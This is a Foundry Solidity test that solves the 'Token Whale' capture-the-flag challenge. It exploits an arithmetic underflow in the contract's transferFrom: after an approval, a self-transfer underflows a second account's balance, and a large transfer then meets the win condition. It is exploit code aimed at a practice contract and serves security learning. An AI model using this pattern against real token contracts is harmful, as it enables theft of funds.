// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import {Test, console2} from "forge-std/Test.sol";
import {TokenWhaleChallenge} from "../src/whale-challenge/TokenWhaleChallenge.sol";

contract TokenWhaleChallengeTest is Test {
    address user1;
    address user2;
    uint256 constant MILLION = 1000000;
    uint256 constant VALUE = 1;
    TokenWhaleChallenge token;

    function setUp() public {
        user1 = address(111);
        user2 = address(222);

        token = new TokenWhaleChallenge(user1);
    }

    function testExploit() public {
        vm.prank(user1);
        token.approve(user2, VALUE);

        vm.startPrank(user2);
        token.transferFrom(user1, user1, VALUE);
        token.transfer(user1, MILLION - VALUE);

        vm.stopPrank();

        assert(token.isComplete());
    }
}
